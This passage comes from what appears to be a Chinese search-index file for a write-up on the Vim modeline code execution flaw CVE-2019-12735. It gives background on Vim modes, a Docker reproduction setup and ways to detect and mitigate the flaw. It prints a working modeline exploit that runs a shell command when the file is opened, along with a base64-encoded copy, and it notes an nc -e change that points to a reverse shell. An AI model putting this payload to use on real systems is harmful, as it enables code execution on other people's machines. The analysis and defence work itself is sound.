high)\n\n\n\n\n\u8fd9\u4e2a\u547d\u4ee4\u7684\u529f\u80fd\u662f\u63a7\u5236Terminal\u7684\u663e\u793a\u529f\u80fd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6587\u672c\u957f\u5ea6\u8d85\u8fc7Terminal\u7684\u663e\u793a\u957f\u5ea6\uff0c\u5219\u4f1a\u81ea\u52a8\u6362\u884c\uff0c\u5982\u679c\u5173\u95ed\u4e86\u81ea\u52a8\u6362\u884c\uff0c\u5219\u4f1a\u5168\u90e8\u663e\u793a\u5728\u4e00\u884c\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u88ab\"\u622a\u65ad\"\n\n\n\n\n\u200b        \n      \n\n\n\\x1b[?7l \u548c \\x1b[1G \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a\n\n\n\u4f7f\u7528\u524d \uff1a     \n               \n\n\n\u4f7f\u7528\u540e\uff1a\n\n\n      \n\n\n\\x1b[?7l \u548c \\x1b[1G + \\x1b[K \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a        \n      \n\n\n\\x16\n\n\n\u53c2\u8003:\n\n\nhttp://defindit.com/ascii.html\nhttps://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\n\n\n\n\n\u8fd9\u662f\u4e00\u4e2aascii\u7801\u7684\u63a7\u5236\u5b57\u7b26\uff0c\u4ee3\u8868 ctrl+v\uff0c\u5b83\u7684\u529f\u80fd\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a\u8ba9\u4e0b\u4e00\u4e2a\u8f93\u5165\u8bc6\u522b\u4e3a\u666e\u901a\u5b57\u7b26\n\n\n$ cat a.py\na = input(\"> \")\nprint(ord(a[0]))\n\n$ python3 a.py\n# \u60f3\u76f4\u63a5\u8f93\u5165ctrl+c, \u4f46\u7a0b\u5e8f\u9000\u51fa\uff0c\u88ab\u8bc6\u522b\u6210\u4e86\u4e2d\u65ad\u4fe1\u53f7\n> ^CTraceback (most recent call last):\n  File \"a.py\", line 1, in <module>\n    a = input(\"> \")\nKeyboardInterrupt\n\n$ python3 a.py\n# \u4f9d\u6b21\u6309\u4e0bctrl+v\u548cctrl+c, \u5c31\u987a\u5229\u6253\u5370\u51fa\u4e86ctrl+c\u7684ascii\u7801\n> ^C\n3\n\n\n\n\n\n\u4e3a\u4ec0\u4e48Exp\u4e2d\u9700\u8981\\x16\u63a7\u5236\u5b57\u7b26\n\n\necho -e \"iHello\\x1b[D\" > a.vim\n$ vim \n:source! a.vim\n\nHello\n~                                                                      ...   \n~                                                                               \nE388: Couldn't find definition\n\n\u8fd9\u4e2a\u62a5\u9519\u53ef\u4ee5\u624b\u52a8\u8f93\u5165\u4e0b\u9762\u7684\u6307\u4ee4\u4ea7\u751f\uff1a\n$ vim\ni\nHello\n<ESC>\n[\nshift+d\n\n# \u5982\u679c\u52a0\u4e0a\\x16\u5219\\x1b\u4e0d\u4f1a\u88ab\u89e3\u6790\u6210<ESC>\u6309\u952e\uff0c\u800c\u662f\u8f93\u5165\u5b57\u7b26\necho -e \"iHello\\x16\\x1b[D\" > a.vim\n\nHello^[[D\n~                                                                      ...\n~\n\n-- INSERT --\n\n\n\n\n\n\n\n\nexp\u4fee\u6539\u8bf4\u660e\n\n\n\n\nnc -> nc.traditional \n\n\n\n\nUbuntu\u4e0a\u7684nc\u4e0d\u5305\u542b-e\u9009\u9879\uff0c\u89e3\u51b3\u529e\u6cd5\u662f\u5b89\u88c5nc.traditional\u6765\u66ff\u4ee3nc\u547d\u4ee4\n\n\n\n\n\\x1b[K -> \\x1b[2K \u548c \\x1b[D -> \\x1b[2D \u548c\u7a7a\u683c\u662f\u7528\u4e8e\u6e05\u9664\u4e0d\u53ef\u89c1\u5b57\u7b26\\x16\u548c\u5f15\u53f7\n\n\n\n\n\u4fee\u6539\u524d: \n\n\n\u200b        \n\n\n\u200b               \n       \n\n\n\u4fee\u6539\u540e:        \n               \n\n\n       \n\n\nVim\u5b89\u88c5\n\n\napt\u81ea\u52a8\u5b89\u88c5\n\n\napt-get install vim-runtime=2:7.4.1689-3ubuntu1\napt-get install vim-common=2:7.4.1689-3ubuntu1\napt-get install vim=2:7.4.1689-3ubuntu1\n\n\n\n\n\n\u4f7f\u7528deb\u5305\u5b89\u88c5\n\n\n\u94fe\u63a5:https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw \u5bc6\u7801:m0qc\n\n\nsudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb\n\n\n\n\n\u4e0b\u8f7d\u6e90\u7801\u624b\u52a8\u7f16\u8bd1\n\n\n# \u4e0b\u8f7d\u6e90\u7801\uff0c\u7f16\u8bd1\u751f\u6210\u7b26\u53f7\n# \u53c2\u8003\uff1ahttps://www.unix.com/programming/156665-compile-debug-vim-source-code.html\n$ mkdir ~/MyVim\n$ cd ~/MyVim\n$ sudo apt-get install libncurses5-dev libncursesw5-dev\n$ apt-get source vim=2:7.4.1689-3ubuntu1\n$ cd src\n$ cp Makefile Makefile.orig\n$ vim Makefile\n$ diff Makefile Makefile.orig\n540c540\n< CFLAGS = -g\n---\n> #CFLAGS = -g\n908c908\n< prefix = ~/MyVim\n---\n> #prefix = $(HOME)\n1852c1852\n< #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n---\n>     $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n$ cd ..\n$ make && make install\n$ cd bin\n$ gdb ./vim\n\n\n\n\n\nDocker\u590d\u73b0\u73af\u5883\u642d\u5efa\n\n\n\u53ef\u4ee5\u901a\u8fc7Docker\u5feb\u901f\u642d\u5efapoc\u590d\u73b0\u73af\u5883\n\n\n$ ls\nDockerfile\n$ cat Dockerfile\nFrom ubuntu:16.04\nRUN set -e -x ;\\\n    apt update ;\\\n    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\\\n    echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > /root/poc.txt \n\n$ sudo docker build -t vim-cve-2019-12735 .\n$ sudo docker run -it vim-cve-2019-12735 /bin/bash\necho -e \"set modeline\\nset modelines=5\" > ~/.vimrc \ncd root\nvim poc.txt\n\n\n\n\n\n\n\u6f0f\u6d1e\u9632\u62a4\n\n\npackage\u7248\u672c\u68c0\u67e5\n\n\n\n\n\u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c\n\n\n\n\n# \u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c\n$ apt-cache policy vim\nvim:\n  Installed: (none)\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  Version table:\n     2:7.4.1689-3ubuntu1.4 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages\n     2:7.4.1689-3ubuntu1 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages\n\n# \u4eceVim\u5305\u7684changelog\u4e2d\u83b7\u53d6\u4fee\u590d\u6f0f\u6d1e\u7684\u7248\u672c\u53f7 2:7.4.1689-3ubuntu1.3\n$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10\n...\nvim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium\n\n  * SECURITY UPDATE: Arbitrary code execution\n    - debian/patches/CVE-2019-12735.patch: disallow\n      sourcing a file in the sandbox in src/getchar.c\n    - CVE-2019-12735\n  * SECURITY UPDATE: Buffer overflow\n    - debian/patches/CVE-2017-5953.patch: check for an\n      invalid length in order to avoid a overflow in\n      src/spell.c.\n    - CVE-2017-5953\n\n\n -- Leonidas S. Barbosa <leo.barbosa@canonical.com>  Fri, 07 Jun 2019 12:35:43 -0300\n\n\n\n\n\n\n\n\n\u5b89\u88c5\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c\n\n\n\n\n\n$ sudo apt install vim-common=2:7.4.1689-3ubuntu1\n$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1\n$ sudo apt install vim=2:7.4.1689-3ubuntu1\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c < 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim:\n  Installed: 2:7.4.1689-3ubuntu1\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n:w\n\n# \u6d4b\u8bd5\u6548\u679c\n$ vim poc.txt\n\nLinux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n\n\nPress ENTER or type command to cont\n\n\n\n\n\n\n\n\u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim\n\n\n\n\n# \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim\n$ sudo apt install vim\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c > 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim\nvim:\n  Installed: 2:7.4.1689-3ubuntu1.4\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n\n\n# \u6d4b\u8bd5\u6548\u679c\uff0c\u672a\u89e6\u53d1\u6f0f\u6d1e\n$ vim poc.txt\n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n~                                                                      ...                                                                    \n~                                                                               \n\"poc.txt\" 1L, 75C  \n\n\n\n\n\n\u914d\u7f6e\u68c0\u67e5\n\n\n# \u68c0\u67e5modeline\u914d\u7f6e:\n$ vim\n:verbose set modeline? \n:verbose set modelines?\n# \u5982\u679c\u663e\u793anomodeline, nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n# \u5982\u679c\u914d\u7f6e\u4e86\uff0c\u5219\u4f1a\u663e\u793a\uff1a\n\n...\n\uff5e                                                                 \n  modeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n...\n\uff5e\n  modelines=5\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n# \u5173\u95edmodeline\u914d\u7f6e\nvim ~/.vimrc\n\u5220\u9664\nset modeline\nset modelines=5\n\u6dfb\u52a0\nset nomodeline\n:wq\n\n# \u518d\u6b21\u68c0\u67e5\n$ vim\n:verbose set modeline? \n\n~                                                                     \nnomodeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n\n\n\n\n\npoc\u9a8c\u8bc1\n\n\n\u8bfb\u53d6stdout\n\n\n\u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\u8bfb\u53d6stdout\u6839\u636e\u8f93\u51fa\u5224\u65ad(\u76ee\u524d\u7684\u6765\u770b\uff0c\u83b7\u53d6vim\u7684\u8f93\u51fa\u8c8c\u4f3c\u6709\u4e9b\u9ebb\u70e6)\n\n\n\u4e0d\u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout: \n\n\n$ vim poc.txt >out.txt\nVim: Warning: Output is not to a terminal\n$ cat out.txt \n# \u5185\u5bb9\u4e3a\u7a7a \n\n\n\n\n\n\u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout: \n\n\n$ vim poc.txt > out.txt\nVim: Warning: Output is not to a terminal\n\nPress ENTER or type command to continue\n\n$ cat out.txt \nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\n\n\n\n\n\n\u68c0\u67e5\u8c03\u7528\u6808\n\n\n\u7c7b\u4f3c\u7684\uff0c\u901a\u8fc7\u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\uff0cptrace\u8c03\u7528\u6808\uff0c\u68c0\u67e5\u662f\u5426\u6709do_shell\u8c03\u7528\u65e0\u6f0f\u6d1e\u65f6\u6b63\u5e38\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff1a\n\n\ngdb-peda$ bt\n#0  0x00007fca6f40b5b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, \n#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at \n...\n\n\n\n\n\n\u5b58\u5728\u6f0f\u6d1e\u65f6\uff0c\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff0c\u6709\u4e00\u4e2a\u660e\u663e\u7684do_shell\u7684\u8c03\u7528:\n\n\ngdb-peda$ bt\n#0  0x00007f4ba14135b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901\n#11 0x000000000045ce32 in do_shell (\n    cmd=0x15c7ea0 \"uname -a||\\\" vi:fen:fdm=expr:fde=assert_fails(\\\"source!\\\\ %\\\"):fdl=0:fdt=\\\"\", flags=0x0) at ex_cmds.c:1572\n#12 0x000000000045c50c in do_bang (addr_count=0x0, \n#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at \n#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, \n#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, \n#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at \n#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, \n#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at",
            "title": "Cve 2019 12735 01"
        },
        {
            "location": "/cve-2019-12735-01/#cve-2019-12735",
            "text": "",
            "title": "cve-2019-12735\u9644\u4ef6"
        },
        {
            "location": "/cve-2019-12735-01/#_1",
            "text": "",
            "title": "\u80cc\u666f\u77e5\u8bc6"
        },
        {
            "location": "/cve-2019-12735-01/#vim",
            "text": "http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro  Normal mode  \u901a\u8fc7 $ vim file \u6253\u5f00\u6587\u4ef6\u540e\u8fdb\u5165\u7684\u6a21\u5f0f  $ vim hello.txt\nHello\n~                                                                     \n~                                                                      \n~                                                                      ...\n~                                                                               \n\"hello.txt\" 1L, 6C  \u901a\u8fc7source!\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9  Command-line mode    \u5728normal mode\u4e0b\u8f93\u5165 : ( and / ? ) \u8fdb\u5165Command-line mode    \u5728Vim\u7684Command-line\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u6267\u884cVim commands   \u5176\u4e2d\uff0c\u901a\u8fc7  :!{shell cmd}  \u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4   # http://vimdoc.sourceforge.net/htmldoc/various.html#:!\n$ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue  Ex mode    \u901a\u8fc7$ vim -e  file \u8fdb\u5165\u8be5\u6a21\u5f0f    \u4e5f\u53ef\u4ee5\u5728Normal mode\u4e0b\u8f93\u5165Q\u8fdb\u5165\u8be5\u6a21\u5f0f   \u8fd9\u4e2a\u6a21\u5f0f\u7684\u7279\u70b9\u662f\u53ef\u4ee5\u8fde\u7eed\u6267\u884cVim command\uff0c\u53ef\u4ee5\u7c7b\u6bd4 python \u7684\u547d\u4ee4\u884c\u6a21\u5f0f  \u901a\u8fc7source\u52a0\u8f7d\u7684\u811a\u672c\u7684\u5185\u5bb9\uff0c\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e0b\u8f93\u5165\u7684\u5185\u5bb9   Insert mode    \u5728Normal mode\u4e0b\u8f93\u5165i\u53ef\u4ee5\u8fdb\u5165Insert mode, \u8fd9\u4e2a\u6a21\u5f0f\u76f8\u5f53\u4e8e\u7f16\u8f91\u6a21\u5f0f\uff0c\u5927\u90e8\u5206\u64cd\u4f5c\u548c\u5728\u8bb0\u4e8b\u672c\u4e2d\u4e00\u6837\u3002    \u53e6\u5916\u8fd8\u6709 \"I\", \"a\", \"A\", \"o\", \"O\", \"c\", \"C\", \"s\" or S\"\u4e5f\u53ef\u4ee5\u4eceNormal mode\u8fdb\u5165Insert mode.    \u5177\u4f53\u6a21\u5f0f\u8f6c\u6362\u89c1: http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro    \u5176\u4e2d\"S\"\u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u8fdb\u5165Insert mode    ```shell\n  # :help S\n  #                                                          S \n  # [\"x]S                   Delete [count] lines [into register x] and start\n  #                         insert.  Synonym for \"cc\" |linewise|.  # Demo\u6f14\u793a\n  $ vim 1.vim\n  :let i = 1\n  :while i < 10\n  :    let a = getline(i)\n  :    if empty(a)\n  :        break\n  :    endif\n  :    echo \"Line:\" i \"is\"  a\n  :    let i += 1\n  :endwhile\n  ~                                                                     \n  ...    \n  ~                                                                              \n  \"1.vim\" 9L, 147C  S(shift+s)  :while i < 10\n  :    let a = getline(i)\n  :    if empty(a)\n  :        break\n  :    endif\n  :    echo \"Line:\" i \"is\"  a\n  :    let i += 1\n  :endwhile\n  ~                                                                      ...\n  ~  -- INSERT --\n   \n  p  (p\u662f\u7c98\u8d34)\n  p  :let i = 1\n  :let i = 1\n  :while i < 10\n  :    let a = getline(i)\n  :    if empty(a)\n  :        break\n  :    endif\n  :    echo \"Line:\" i \"is\"  a\n  :    let i += 1\n  :endwhile\n  ~                                                                      ...  ```",
            "title": "Vim\u7684\u6a21\u5f0f"
        },
        {
            "location": "/cve-2019-12735-01/#vim-options",
            "text": "Vim\u7684options\u76f8\u5f53\u4e8e\u7f16\u8f91\u5668\u7684\u914d\u7f6e\uff0c\u901a\u8fc7command-line\u6a21\u5f0f\u7684:set\u547d\u4ee4\u624b\u52a8\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u81ea\u52a8\u914d\u7f6e\uff0c\u81ea\u52a8\u914d\u7f6e\u7684\u65b9\u6cd5\u4e3b\u8981\u662f\u901a\u8fc7Vim\u811a\u672c(.vimrc, .exrc)\u6216\u8005modeline\u65b9\u5f0f\u3002",
            "title": "Vim options\u7684\u6982\u5ff5"
        },
        {
            "location": "/cve-2019-12735-01/#vimmodeline",
            "text": "\u53c2\u80031: http://vimdoc.sourceforge.net/htmldoc/options.html#modeline    \u53c2\u80032: https://vim.fandom.com/wiki/Modeline_magic    modeline\u7528\u4e8e\u5728\u6587\u672c\u6587\u4ef6\u7684\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u8bbe\u7f6evim options, \u8ba9vim\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u5019\u81ea\u52a8\u52a0\u8f7d\u5e76\u6267\u884c\u8be5\u914d\u7f6e  \n# modeline \u6709\u4e24\u79cd\u683c\u5f0f\n# \u7b2c\u4e00\u79cd\u683c\u5f0f\uff1a [text]{white}{vi:|vim:|ex:}[white]{options}\n#                           vi:noai:sw=3 ts=6 \n# - text\u53ef\u4ee5\u7528\u6765\u653e\u7f6e\u7f16\u7a0b\u8bed\u8a00\u7684\u6ce8\u91ca(python\u7684 # , C \u7684// )\uff0c\u662f\u53ef\u9009\u7684\n# - vi:\u4e4b\u524d\u4e00\u5b9a\u8981\u6709\u7a7a\u683c\n# - options\u7528\":\"\u6216\u8005\u7a7a\u683c\u5206\u9694\n\n\n# \u7b2c\u4e8c\u79cd\u683c\u5f0f\uff1a    \n#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]\n#               /* vim: set ai tw=75: */ \n# - \u9996\u5c3e\u90fd\u53ef\u4ee5\u7528text\u4e3b\u8981\u662f\u652f\u6301(C\u7684\u8fd9\u79cd\u6ce8\u91ca \"/**/\")\uff0c\u9996\u5c3e\u7684text\u90fd\u662f\u53ef\u9009\u7684\n# - vim: \u540e\u9762\u8981\u6709\u7a7a\u683c\n# - \u8981\u6709\u4e00\u4e2aset(\u53ef\u4ee5\u7f29\u5199\u6210 se\uff0c\u540e\u9762\u8ddf\u7a7a\u683c)\n# - options\u7528\u7a7a\u683c\u5206\u9694\n# - \u7ed3\u5c3e\u8981\u6709\u5192\u53f7 :   \u5f00\u542fmodeline  # \u7f16\u8f91~/.vimrc\n# \u6dfb\u52a0\uff1a\nset modeline\nset modelines=5  \u5177\u4f53\u4f7f\u7528  # \u7528Vim\u6253\u5f00\u6587\u672c\uff1a\n$ vim a.py\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n# cursor is here \n\ndef main():\n        func1()\n\nmain()\n\n\n# \u6253\u5f00a.py\u540e, \u9ed8\u8ba4\u7684tab\u957f\u5ea6\u662f8\u4e2a\u7a7a\u683c\uff0c\u4e0d\u652f\u6301\u56de\u8f66\u81ea\u52a8\u7f29\u8fdb\n# \u53ef\u4ee5\u901a\u8fc7tabstop\u548cautoindent\u4e24\u4e2a\u9009\u9879\u6765\u914d\u7f6e\n:set tabstop=4\n:set autoindent\n\n\n# \u6548\u679c\u5982\u4e0b\uff1a\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()\n\n\n# \u4f46\u662f\u4e0b\u6b21\u6253\u5f00\u540e\uff0c\u53c8\u9700\u8981\u518d\u914d\u7f6e\u4e00\u6b21\n# \u53ef\u4ee5\u901a\u8fc7modeline\u6765\u4f7f\u8fd9\u4e2a\u914d\u7f6e\u6bcf\u6b21\u6253\u5f00a.py\u6587\u4ef6\u65f6\u90fd\u751f\u6548\n# \u5728\u6587\u4ef6\u5f00\u5934\u6dfb\u52a0\u4e00\u884c\u5185\u5bb9\uff1a # vim: set tabstop=4 autoindent: \n# \u518d\u6b21\u6253\u5f00\u6548\u679c\u5982\u4e0b\uff1a\n\n$ vim a.py\n# vim: set tabstop=4 autoindent: \n# python3\n# coding=utf-8\nimport platform\n\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()   For security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox   \u4e3a\u4e86\u5b89\u5168\u539f\u56e0\uff0c\u53ea\u6709\u90e8\u5206options\u53ef\u4ee5\u5728modeline\u4e2d\u914d\u7f6e\uff0c\u5982\u679coption\u7684\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f(\u6bd4\u5982\u914d\u7f6efoldexpr)\uff0c\u90a3\u4e48\u8868\u8fbe\u5f0f\u4f1a\u5728vim\u7684sandbox\u4e2d\u6267\u884c",
            "title": "Vim\u7684modeline\u529f\u80fd"
        },
        {
            "location": "/cve-2019-12735-01/#vim_1",
            "text": "\u6839\u636eVim Script\u8bed\u6cd5\u7f16\u5199Vim\u811a\u672c\uff0c\u53c2\u8003\uff1a  https://github.com/name5566/vim-config/blob/master/vim_script.md\nhttp://vimdoc.sourceforge.net/htmldoc/usr_41.html\nhttp://vimdoc.sourceforge.net/htmldoc/eval.html\nhttp://vimdoc.sourceforge.net/htmldoc/eval.html#functions  # \u521b\u5efa\u4e00\u4e2aVim\u811a\u672c1.vim\n$ vim 1.vim\n\n\n# \u6309\u7167Vim Script\u8bed\u6cd5\u7f16\u8f91\u811a\u672c\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a) \n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n\n\n# \u4fdd\u5b58\n:w\n\n\n# \u7528source\u6307\u4ee4\u52a0\u8f7d\u81ea\u5df1\u5e76\u6267\u884c\n:source % \n# or\n:source 1.vim\n\n\n# \u6267\u884c\u7ed3\u679c\uff1a\nLine: 1 is :let i = 1\nLine: 2 is :while i < 10\nLine: 3 is :    let a = getline(i)\nLine: 4 is :    if empty(a)\nLine: 5 is :        break\nLine: 6 is :    endif\nLine: 7 is :    echo \"Line:\" i \"is\"  a\nLine: 8 is :    let i += 1\nLine: 9 is :endwhile\nPress ENTER or type command to continue\n\n\n\n# \u5728\u7f16\u8f91\u5176\u4ed6\u6587\u4ef6\u7684\u65f6\u5019\u52a0\u8f7d\u5e76\u6267\u884c\u4e00\u4e2aVim\u811a\u672c\n$ vim a.txt\nHello\nVim\nGoodbye!\n~         \n:source 1.vim\n\n\nLine: 1 is Hello\nLine: 2 is Vim\nLine: 3 is Goodbye!\nPress ENTER or type command to continue",
            "title": "Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c"
        },
        {
            "location": "/cve-2019-12735-01/#source",
            "text": "source\u547d\u4ee4\u7528\u4e8e\u4eceVim\u811a\u672c\u6587\u4ef6\u4e2d\u8bfb\u53d6Vim\u6307\u4ee4\u5e76\u6267\u884c\uff0c\u53c2\u8003\uff1ahttp://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts  :help source\n\n:so[urce] {file}        \n  Read Ex commands from {file}.  \n  These are commands that start with a \":\".\n\n\n:so[urce]! {file}       \n  Read Vim commands from {file}.  \n  These are commands that are executed from Normal mode, \n  like you type them.  source\u548csource!\u7684\u533a\u522b\u5728\u4e8e\uff1a   source\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Ex commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u7684\u5185\u5bb9\u5fc5\u987b\u662f :cmd \u7684\u5f62\u5f0f  source!\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Normal mode\u4e0b\u6267\u884c\u7684vim commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u4e2d\u7684 <ESC> i /  \u5b57\u7b26\u8fd9\u4e9b\u90fd\u4f1a\u5f53\u6210Normal mode\u4e0b\u7684\u7528\u6237\u8f93\u5165(like you type them)   # \u521b\u5efa\u4e00\u4e2avim\u811a\u672c\uff0c\u5199\u5165\u5185\u5bb9iHello,World\u540e\u4fdd\u5b58\n$ vim 5.vim\niHello,World\n\n:wq\n\n# \u7528source! \u52a0\u8f7d\u5e76\u6267\u884c\u811a\u672c\n$ vim \n:source! 5.vim\n\n# \u6548\u679c\u5982\u4e0b\uff0c\u6253\u5f00\u540e\u76f4\u63a5\u8fdb\u5165\u4e86Insert mode\nHello,World\n\n~                                                                      \n~                                                                      \n...                                                                    \n~                                                                       \n~                                                                                                        \n-- INSERT --\n\n\n# \u800c\u7528source\u52a0\u8f7d\u5219\u4f1a\u62a5\u9519\n$ vim \n:source 5.vim\n\n\nError detected while processing 5.vim:\nline    1:\nE492: Not an editor command: iHello,World\nPress ENTER or type command to continue",
            "title": "source\u547d\u4ee4"
        },
        {
            "location": "/cve-2019-12735-01/#vimshell",
